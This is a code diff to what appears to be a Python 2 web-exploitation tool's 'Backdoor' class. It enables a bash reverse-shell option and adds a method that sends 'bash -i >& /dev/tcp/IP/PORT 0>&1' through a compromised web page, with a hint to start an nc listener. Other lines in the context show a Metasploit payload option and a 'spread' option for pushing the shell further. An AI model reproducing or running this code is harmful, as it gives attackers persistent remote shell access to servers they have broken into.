@@ -19,7 +19,7 @@ class Backdoor(object):
     def list(self):
         print '\n[i] Usage: @backdoor [module] <*ip:port>'
         print '[i] Modules:'
-        #print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions of bash support this!)'
+        print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions of bash support this!)'
         #print '[i] \t*java   \t\tUse java to create a reverse shell'
         print '[i] \t*msf    \t\tUse a linux metereter to create a reverse shell'
         #print '[i] \t*msf-php    \t\tUse a PHP metereter to create a reverse shell'
@@ -31,7 +31,12 @@ class Backdoor(object):
         print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
         print '[i] \tspread  \t\tSpread this shell around'
         #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'
-
+    def bash(self,ip,port):
+	path = "/bin/bash"
+	raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
+	cmd = 'nohup {0} -c \'/bin/bash -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
+	make_request.get_page_source(cmd)
+	print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
     def msf(self, ip, port):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
